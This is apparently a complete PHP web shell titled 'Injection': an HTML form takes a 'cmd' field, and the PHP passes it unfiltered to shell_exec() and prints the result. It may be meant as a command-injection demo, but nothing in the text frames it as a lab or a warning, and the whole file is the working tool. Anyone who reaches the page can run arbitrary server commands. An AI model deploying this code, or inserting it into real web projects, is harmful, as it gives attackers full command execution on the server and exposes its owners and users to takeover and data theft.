<html>
<head>
<title>Injection</title>
</head>
<body>
<form action="" method="post">
<input type="text" name="cmd">
<input type="submit" value="Execute">
</body>
</html>

<?php

$hello = $_POST['cmd'];

$data = shell_exec($hello);

print_r($data);

?>